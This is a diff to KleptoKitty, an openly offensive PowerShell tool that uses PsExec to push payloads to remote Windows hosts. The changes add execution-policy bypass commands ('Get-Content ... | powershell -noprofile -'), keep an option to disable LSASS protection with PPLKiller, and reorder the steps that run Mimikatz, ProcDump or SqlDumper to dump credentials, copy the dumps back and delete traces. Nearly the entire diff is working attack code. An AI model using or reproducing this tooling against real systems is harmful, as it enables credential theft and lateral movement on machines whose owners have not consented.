@@ -105,7 +105,7 @@
 
         [ValidateSet("PPLKiller")]
         [String]
-        $Bypass = "PPLKiller",
+        $Bypass,
 
         [ValidateScript({Test-Path $_})]
         [String]
@@ -267,6 +267,20 @@
                 $ReturnCode = $false 
             }
         } ElseIf ($RemoteCommandExecution -eq "PsExec") {
+
+            # 
+            # Definition and check for PsExec
+            # If PsExec is not available, the execution of the script is terminated
+            #
+            If (-Not $BinaryPsExec) {
+                $BinaryPsExec = "$BasePath\PsExec64.exe"
+            }    
+            If (-Not (Test-Path $BinaryPsExec)) {
+                Write-ProtocolEntry -Text "Binary for PsExec not found" -LogLevel "Error"
+                $ReturnCode = $false
+                return $ReturnCode
+            }
+
             try {
 
                 #
@@ -354,6 +368,7 @@
     # Environment parameter for KleptoKitty, among other things a protocol
     # of all actions with timestamp is created. This makes report writing easier later. :-)     
     #
+    $KleptoKittyVersion = "0.2.3-1626784956"
     $CurrentLocation = Get-Location
     $BasePath = $CurrentLocation.Path
     $Timestamp = Get-Date -Format yyyyMMdd-HHmm    
@@ -397,21 +412,9 @@
     #
     Write-Output "`n"
     Write-Output "      =^._.^="
-    Write-Output "     _(      )/  KleptoKitty"
+    Write-Output "     _(      )/  KleptoKitty $KleptoKittyVersion"
     Write-Output "`n"
     Write-ProtocolEntry -Text "Starting KleptoKitty" -LogLevel "Info"
-
-    # 
-    # Definition and check for tools
-    # If a tool is not available, the execution of the script is terminated
-    #
-    If (-Not $BinaryPsExec) {
-        $BinaryPsExec = "$BasePath\PsExec64.exe"
-    }    
-    If (-Not (Test-Path $BinaryPsExec)) {
-        Write-ProtocolEntry -Text "Binary for PsExec not found" -LogLevel "Error"
-        Break
-    }
 
     #
     # Request the credentials for the target system. This way KleptoKitty does not
@@ -484,9 +487,9 @@
                 If (-not($ResultCopyPayload)) { Continue }
             }
 
-            # Execute Payload
+            # Execute Payload (Bypass for Execution-Policy)
             Write-ProtocolEntry -Text "Execute payload on $Hostname" -LogLevel "Info"                
-            $PayloadCommandBypass = "$TargetPayloadLocalPath"
+            $PayloadCommandBypass = '-Command "Get-Content '+$TargetPayloadLocalPath+' | powershell -noprofile -"'
             $ResultExecutePayload = Execute-Payload -PayloadCommand $PayloadCommandBypass
             If ($ResultExecutePayload) {
                 Write-ProtocolEntry -Text "Payload $PayloadBypass executed, LSASS protection is (hopefully) disabled now." -LogLevel "Success"
@@ -522,9 +525,9 @@
                 If (-not($ResultCopyPayload)) { Continue }
             }
 
-            # Execute Payload
+            # Execute Payload (Bypass for Execution-Policy)
             Write-ProtocolEntry -Text "Execute payload on $Hostname" -LogLevel "Info"                
-            $PayloadCommandCredentialAccess = "$TargetPayloadLocalPath"
+            $PayloadCommandCredentialAccess = '-Command "Get-Content '+$TargetPayloadLocalPath+' | powershell -noprofile -"'
             $ResultExecutePayload = Execute-Payload -PayloadCommand $PayloadCommandCredentialAccess
             If ($ResultExecutePayload) {
                 Write-ProtocolEntry -Text "Payload $PayloadCredentialAccess executed." -LogLevel "Success"
@@ -567,23 +570,26 @@
             $PayloadCommandCredentialAccess = "$TargetPayloadLocalPath -Token $PayloadKeyCredentialAccess"
             $ResultExecutePayload = Execute-Payload -PayloadCommand $PayloadCommandCredentialAccess -EnableEncoding
             If ($ResultExecutePayload) {
+                
                 Write-ProtocolEntry -Text "Payload $PayloadCredentialAccess executed." -LogLevel "Success"
+            
+                # Good things come to those who wait
+                $SleepTime = 60
+                Write-ProtocolEntry -Text "Let Mimikatz finish. Waiting for $SleepTime seconds!" -LogLevel "Debug"
+                Start-Sleep -Seconds $SleepTime
+
+                # Collect information from host
+                Write-ProtocolEntry -Text "Retrieving log file" -LogLevel "Info"
+                $ResultCopyDump = Copy-Payload -Source $TargetDumpPath -Destination $DumpTargetPath
+                If (($ResultCopyDump)) {
+                    Write-ProtocolEntry -Text "Log file $DumpTargetName saved." -LogLevel "Success"
+                    Delete-File -File $TargetDumpPath
+                }
             }
 
-            # Good things come to those who wait
-            $SleepTime = 60
-            Write-ProtocolEntry -Text "Let Mimikatz finish. Waiting for $SleepTime seconds!" -LogLevel "Debug"
-            Start-Sleep -Seconds $SleepTime
-
-            # Collect information from host
-            Write-ProtocolEntry -Text "Retrieving log file" -LogLevel "Info"
-            $ResultCopyDump = Copy-Payload -Source $TargetDumpPath -Destination $DumpTargetPath
-            If (($ResultCopyDump)) { Write-ProtocolEntry -Text "Log file $DumpTargetName saved." -LogLevel "Success" }
-
             # House Cleaning
-            Write-ProtocolEntry -Text "Delete payload and logs on $Hostname" -LogLevel "Info"
+            Write-ProtocolEntry -Text "Delete payload on $Hostname" -LogLevel "Info"
             Delete-File -File $TargetPayloadPath
-            Delete-File -File $TargetDumpPath            
         }
 
         If ($CredentialAccess -eq "ProcDump") {
@@ -613,28 +619,31 @@
                 If (-not($ResultCopyPayload)) { Continue }
             }
 
-            # Execute payload
+            # Execute Payload (Bypass for Execution-Policy)
             Write-ProtocolEntry -Text "Execute payload on $Hostname" -LogLevel "Info"
-            $PayloadCommandCredentialAccess = "$TargetPayloadLocalPath"
+            $PayloadCommandCredentialAccess = '-Command "Get-Content '+$TargetPayloadLocalPath+' | powershell -noprofile -"'
             $ResultExecutePayload = Execute-Payload -PayloadCommand $PayloadCommandCredentialAccess
             If ($ResultExecutePayload) {
-                Write-ProtocolEntry -Text "Payload $PayloadCredentialAccess executed." -LogLevel "Success"
+            
+                Write-ProtocolEntry -Text "Payload $PayloadCredentialAccess executed." -LogLevel "Success"            
+
+                # Good things come to those who wait
+                $SleepTime = 600
+                Write-ProtocolEntry -Text "Let ProcDump finish. Waiting for $SleepTime seconds!" -LogLevel "Debug"
+                Start-Sleep -Seconds $SleepTime
+
+                # Collect information from host
+                Write-ProtocolEntry -Text "Retrieving dump file" -LogLevel "Info"
+                $ResultCopyDump = Copy-Payload -Source $TargetDumpPath -Destination $DumpTargetPath
+                If (($ResultCopyDump)) {
+                    Write-ProtocolEntry -Text "Dump file $DumpTargetName saved." -LogLevel "Success"
+                    Delete-File -File $TargetDumpPath
+                }
             }
 
-            # Good things come to those who wait
-            $SleepTime = 600
-            Write-ProtocolEntry -Text "Let ProcDump finish. Waiting for $SleepTime seconds!" -LogLevel "Debug"
-            Start-Sleep -Seconds $SleepTime
-
-            # Collect information from host
-            Write-ProtocolEntry -Text "Retrieving dump file" -LogLevel "Info"
-            $ResultCopyDump = Copy-Payload -Source $TargetDumpPath -Destination $DumpTargetPath
-            If (($ResultCopyDump)) { Write-ProtocolEntry -Text "Dump file $DumpTargetName saved." -LogLevel "Success" }
-
             # House Cleaning
-            Write-ProtocolEntry -Text "Delete payload and dump file on $Hostname" -LogLevel "Info"
-            Delete-File -File $TargetPayloadPath
-            Delete-File -File $TargetDumpPath            
+            Write-ProtocolEntry -Text "Delete payload on $Hostname" -LogLevel "Info"
+            Delete-File -File $TargetPayloadPath            
         }
 
         If ($CredentialAccess -eq "SqlDumper") {
@@ -664,28 +673,32 @@
                 If (-not($ResultCopyPayload)) { Continue }
             }
 
-            # Execute payload
+            # Execute Payload (Bypass for Execution-Policy)
             Write-ProtocolEntry -Text "Execute payload on $Hostname" -LogLevel "Info"
-            $PayloadCommandCredentialAccess = "$TargetPayloadLocalPath"
+            $PayloadCommandCredentialAccess = '-Command "Get-Content '+$TargetPayloadLocalPath+' | powershell -noprofile -"'
             $ResultExecutePayload = Execute-Payload -PayloadCommand $PayloadCommandCredentialAccess
             If ($ResultExecutePayload) {
+    
                 Write-ProtocolEntry -Text "Payload $PayloadCredentialAccess executed." -LogLevel "Success"
+            
+                # Good things come to those who wait
+                $SleepTime = 30
+                Write-ProtocolEntry -Text "Let SqlDumper finish. Waiting for $SleepTime seconds!" -LogLevel "Debug"
+                Start-Sleep -Seconds $SleepTime
+
+                # Collect information from host
+                Write-ProtocolEntry -Text "Retrieving dump file" -LogLevel "Info"
+                $ResultCopyDump = Copy-Payload -Source $TargetDumpPath -Destination $DumpTargetPath
+                If (($ResultCopyDump)) {
+                    Write-ProtocolEntry -Text "Dump file $DumpTargetName saved." -LogLevel "Success"
+                    Delete-File -File $TargetDumpPath
+                }
+                
             }
 
-            # Good things come to those who wait
-            $SleepTime = 30
-            Write-ProtocolEntry -Text "Let SqlDumper finish. Waiting for $SleepTime seconds!" -LogLevel "Debug"
-            Start-Sleep -Seconds $SleepTime
-
-            # Collect information from host
-            Write-ProtocolEntry -Text "Retrieving dump file" -LogLevel "Info"
-            $ResultCopyDump = Copy-Payload -Source $TargetDumpPath -Destination $DumpTargetPath
-            If (($ResultCopyDump)) { Write-ProtocolEntry -Text "Dump file $DumpTargetName saved." -LogLevel "Success" }
-
             # House Cleaning
-            Write-ProtocolEntry -Text "Delete payload and dump file on $Hostname" -LogLevel "Info"
-            Delete-File -File $TargetPayloadPath
-            Delete-File -File $TargetDumpPath            
+            Write-ProtocolEntry -Text "Delete payload on $Hostname" -LogLevel "Info"
+            Delete-File -File $TargetPayloadPath                       
         }
 
         #
